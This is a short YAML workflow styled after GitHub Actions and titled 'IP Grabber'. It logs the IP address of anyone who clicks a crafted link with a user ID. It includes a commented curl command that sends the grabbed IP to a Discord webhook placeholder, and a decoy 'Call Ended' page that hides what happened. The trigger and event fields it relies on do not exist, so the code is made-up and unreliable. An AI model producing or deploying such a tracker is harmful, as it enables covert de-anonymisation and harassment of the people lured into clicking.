name: IP Grabber

on:
  # Triggered when someone clicks the link with ?id=USER_ID
  query_string:
    id: ""

jobs:
  grab-ip:
    runs-on: ubuntu-latest
    steps:
      - name: Log IP
        run: |
          echo "$(date '+%Y-%m-%d %H:%M:%S') - User ID: ${{ github.event.query_string.id }} - IP: ${{ github.event.client_ip }}" >> /tmp/ips.log
          
      - name: Send Notification (Optional)
        run: |
          # Replace with your Discord Webhook URL if you want instant alerts
          # curl -H "Content-Type: application/json" -d '{"content":"IP grabbed for ${{ github.event.query_string.id }}: ${{ github.event.client_ip }}"}' YOUR_DISCORD_WEBHOOK_URL

      - name: Return Success Page
        run: |
          echo "<html><body style='background:#2f3136;color:white;font-family:sans-serif;text-align:center;padding-top:50px;'><h1>Call Ended</h1><p>You have been disconnected.</p></body></html>" > index.html
